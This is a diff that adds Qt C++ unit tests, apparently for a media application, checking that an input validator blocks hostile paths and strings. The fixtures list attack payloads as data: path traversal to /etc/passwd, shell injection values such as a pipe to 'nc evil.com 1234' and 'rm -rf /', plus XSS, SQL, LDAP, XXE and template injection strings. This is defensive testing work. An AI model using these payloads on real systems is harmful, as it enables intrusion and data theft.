@@ -68,6 +68,12 @@ private slots:
     void testNullByteInjection();
     void testEncodingAttacks();
     void testTimingAttacks();
+    
+    // Enhanced Security Tests
+    void testEnhancedSecurityValidation();
+    void testComprehensivePathSafety();
+    void testAdvancedSymlinkDetection();
+    void testMaliciousInputRegression();
 
 private:
     std::unique_ptr<SandboxManager> sandbox_;
@@ -1315,6 +1321,253 @@ void TestSecurityComponents::testTimingAttacks() {
     // Times should be similar (within 50% difference)
     double ratio = static_cast<double>(qMax(validTime, invalidTime)) / qMin(validTime, invalidTime);
     QVERIFY2(ratio < 1.5, QString("Timing difference too large: %1ms vs %2ms").arg(validTime).arg(invalidTime).toUtf8());
+}
+
+void TestSecurityComponents::testEnhancedSecurityValidation() {
+    TEST_SCOPE("testEnhancedSecurityValidation");
+    
+    // Test enhanced null byte detection
+    QStringList nullByteInputs = {
+        QString::fromUtf8("file.txt\x00malicious.exe", 21),
+        "file.txt%00malicious.exe",
+        "file.txt\\x00malicious.exe",
+        "file.txt\\0malicious.exe"
+    };
+    
+    for (const QString& input : nullByteInputs) {
+        QVERIFY2(InputValidator::hasNullBytes(input),
+                QString("Null bytes not detected in: %1").arg(input.left(20)).toUtf8());
+        QVERIFY2(!InputValidator::validateFilePath(input),
+                QString("File path with null bytes accepted: %1").arg(input.left(20)).toUtf8());
+    }
+    
+    // Test length safety
+    QString longInput = QString("A").repeated(10000);
+    QVERIFY(!InputValidator::isLengthSafe(longInput, 1000));
+    QVERIFY(InputValidator::isLengthSafe("short", 1000));
+    
+    // Test encoding attack detection
+    QStringList encodingAttacks = {
+        "%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "%2e%2e%252f%2e%2e%252fetc%252fpasswd",
+        "\\x2e\\x2e\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64"
+    };
+    
+    for (const QString& attack : encodingAttacks) {
+        QVERIFY2(InputValidator::containsEncodingAttacks(attack),
+                QString("Encoding attack not detected: %1").arg(attack).toUtf8());
+    }
+    
+    // Test Unicode safety
+    QStringList unicodeAttacks = {
+        QString::fromUtf8("file\u202ename.txt\u202dexe"), // BIDI override
+        QString::fromUtf8("normal\uFEFFhidden.txt"), // Zero-width no-break space
+        QString::fromUtf8("test\u00A0file.txt"), // Non-breaking space
+        QString::fromUtf8("file\u200Bname.txt") // Zero-width space
+    };
+    
+    for (const QString& attack : unicodeAttacks) {
+        QVERIFY2(!InputValidator::isUnicodeSafe(attack),
+                QString("Unsafe Unicode not detected: %1").arg(attack).toUtf8());
+    }
+    
+    TestUtils::logMessage("Enhanced security validation tests completed");
+}
+
+void TestSecurityComponents::testComprehensivePathSafety() {
+    TEST_SCOPE("testComprehensivePathSafety");
+    
+    // Test the comprehensive isPathSafe function with various attack vectors
+    QStringList unsafePaths = {
+        // Null bytes
+        QString::fromUtf8("/tmp/file\x00malicious", 19),
+        // Path traversal
+        "../../../etc/passwd",
+        "/tmp/../../../etc/shadow",
+        // Encoding attacks
+        "%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
+        // Unicode attacks
+        QString::fromUtf8("/tmp/\u202efile\u202d.txt"),
+        // Shell injection
+        "/tmp/file;rm -rf /",
+        "/tmp/file|nc evil.com 1234",
+        "/tmp/file`whoami`",
+        "/tmp/file$(id)",
+        // Control characters
+        "/tmp/file\nmalicious",
+        "/tmp/file\rmalicious",
+        "/tmp/file\tmalicious",
+        // Excessive length
+        QString("/tmp/").repeated(2000) + "file.txt"
+    };
+    
+    for (const QString& unsafePath : unsafePaths) {
+        QVERIFY2(!InputValidator::isPathSafe(unsafePath),
+                QString("Unsafe path accepted: %1").arg(unsafePath.left(50)).toUtf8());
+    }
+    
+    // Test safe paths
+    QStringList safePaths = {
+        "/tmp/safe_file.txt",
+        "/home/user/documents/video.mp4",
+        "/Users/username/Downloads/movie.avi",
+        "C:\\Users\\User\\Videos\\file.mkv"
+    };
+    
+    for (const QString& safePath : safePaths) {
+        QVERIFY2(InputValidator::isPathSafe(safePath),
+                QString("Safe path rejected: %1").arg(safePath).toUtf8());
+    }
+    
+    TestUtils::logMessage("Comprehensive path safety tests completed");
+}
+
+void TestSecurityComponents::testAdvancedSymlinkDetection() {
+    TEST_SCOPE("testAdvancedSymlinkDetection");
+    
+    // Create test directory structure
+    QString testDir = tempDir_->path() + "/symlink_test";
+    QDir().mkpath(testDir);
+    
+    // Create a normal file
+    QString normalFile = testDir + "/normal.txt";
+    QFile file(normalFile);
+    if (file.open(QIODevice::WriteOnly)) {
+        file.write("normal content");
+        file.close();
+    }
+    
+    // Test symlink safety for normal file
+    QVERIFY(InputValidator::isSymlinkSafe(normalFile));
+    
+    // Create a symlink to system directory (if possible)
+    QString symlinkPath = testDir + "/evil_symlink";
+    QString systemTarget = "/etc/passwd";
+    
+    // Try to create symlink (may fail due to permissions, which is fine)
+    if (QFile::link(systemTarget, symlinkPath)) {
+        // If symlink creation succeeded, it should be detected as unsafe
+        QVERIFY2(!InputValidator::isSymlinkSafe(symlinkPath),
+                "Symlink to system file not detected as unsafe");
+    }
+    
+    // Test non-existent paths (should be safe to allow for validation elsewhere)
+    QString nonExistentPath = testDir + "/does_not_exist.txt";
+    QVERIFY(InputValidator::isSymlinkSafe(nonExistentPath));
+    
+    TestUtils::logMessage("Advanced symlink detection tests completed");
+}
+
+void TestSecurityComponents::testMaliciousInputRegression() {
+    TEST_SCOPE("testMaliciousInputRegression");
+    
+    // Regression tests for specific attack patterns found in security research
+    struct MaliciousInput {
+        QString input;
+        QString description;
+        bool shouldBeBlocked;
+    };
+    
+    QVector<MaliciousInput> maliciousInputs = {
+        // Buffer overflow attempts
+        {QString("A").repeated(10000), "Buffer overflow - long string", true},
+        {QString("\\x41").repeated(1000), "Buffer overflow - hex pattern", true},
+        
+        // Format string attacks
+        {"%n%n%n%n%n%n%n%n%n%n", "Format string - %n repeated", true},
+        {"%08x%08x%08x%08x%08x", "Format string - %x repeated", true},
+        {"%s%s%s%s%s%s%s%s%s%s", "Format string - %s repeated", true},
+        
+        // Path traversal variants
+        {"....//....//....//etc/passwd", "Path traversal - dot variant", true},
+        {".\\.\\.\\.\\.\\windows\\system32", "Path traversal - Windows variant", true},
+        {"foo/../../../../../../../etc/passwd", "Path traversal - with prefix", true},
+        
+        // Command injection
+        {"file.txt;cat /etc/passwd", "Command injection - semicolon", true},
+        {"file.txt|nc evil.com 1234", "Command injection - pipe", true},
+        {"file.txt`whoami`", "Command injection - backtick", true},
+        {"file.txt$(uname -a)", "Command injection - dollar paren", true},
+        
+        // XSS variants
+        {"<script>alert('xss')</script>", "XSS - basic script", true},
+        {"<img src=x onerror=alert('xss')>", "XSS - img onerror", true},
+        {"javascript:alert('xss')", "XSS - javascript protocol", true},
+        {"<svg onload=alert('xss')>", "XSS - svg onload", true},
+        
+        // SQL injection
+        {"'; DROP TABLE users; --", "SQL injection - drop table", true},
+        {"' OR '1'='1", "SQL injection - always true", true},
+        {"' UNION SELECT * FROM users --", "SQL injection - union select", true},
+        
+        // Encoding evasion
+        {"%3Cscript%3Ealert('xss')%3C/script%3E", "Encoding evasion - URL encoded XSS", true},
+        {"&#60;script&#62;alert('xss')&#60;/script&#62;", "Encoding evasion - HTML entities", true},
+        {"%252e%252e%252f%252e%252e%252fetc%252fpasswd", "Encoding evasion - double URL encoded", true},
+        
+        // Unicode normalization attacks
+        {QString::fromUtf8("\u202e.exe.txt"), "Unicode - BIDI override", true},
+        {QString::fromUtf8("\uFEFF\u200B\u200C"), "Unicode - zero-width chars", true},
+        
+        // LDAP injection
+        {"*)(uid=*))(|(uid=*", "LDAP injection", true},
+        {"*)(|(mail=*))", "LDAP injection - mail", true},
+        
+        // XML/XXE attacks
+        {"<!DOCTYPE test [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]\u003e", "XXE attack", true},
+        {"<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]>", "XXE Windows", true},
+        
+        // NoSQL injection
+        {"'; return '' == '\n", "NoSQL injection", true},
+        {"\"$ne\": null", "NoSQL injection - not equal", true},
+        
+        // Template injection
+        {"{{7*7}}", "Template injection - basic", true},
+        {"${7*7}", "Template injection - EL", true},
+        {"<%=7*7%>", "Template injection - JSP", true},
+        
+        // Safe inputs (should not be blocked)
+        {"normal_file.txt", "Safe filename", false},
+        {"/home/user/video.mp4", "Safe absolute path", false},
+        {"My Movie (2023).mkv", "Safe filename with spaces", false},
+        {"user@example.com", "Safe email", false}
+    };
+    
+    int blocked = 0, allowed = 0;
+    
+    for (const auto& test : maliciousInputs) {
+        bool isBlocked = false;
+        
+        // Test with various validation functions
+        if (InputValidator::containsSuspiciousContent(test.input) ||
+            InputValidator::hasNullBytes(test.input) ||
+            !InputValidator::isUnicodeSafe(test.input) ||
+            InputValidator::containsEncodingAttacks(test.input) ||
+            InputValidator::isPathTraversalAttempt(test.input)) {
+            isBlocked = true;
+        }
+        
+        // For path-like inputs, also test path safety
+        if (test.input.contains('/') || test.input.contains('\\')) {
+            if (!InputValidator::isPathSafe(test.input)) {
+                isBlocked = true;
+            }
+        }
+        
+        if (test.shouldBeBlocked) {
+            QVERIFY2(isBlocked, QString("Malicious input not blocked: %1 (%2)")
+                    .arg(test.input.left(50), test.description).toUtf8());
+            blocked++;
+        } else {
+            QVERIFY2(!isBlocked, QString("Safe input incorrectly blocked: %1 (%2)")
+                    .arg(test.input, test.description).toUtf8());
+            allowed++;
+        }
+    }
+    
+    TestUtils::logMessage(QString("Malicious input regression: %1 blocked, %2 allowed")
+                         .arg(blocked).arg(allowed));
 }
 
 int runTestSecurityComponents(int argc, char** argv) {
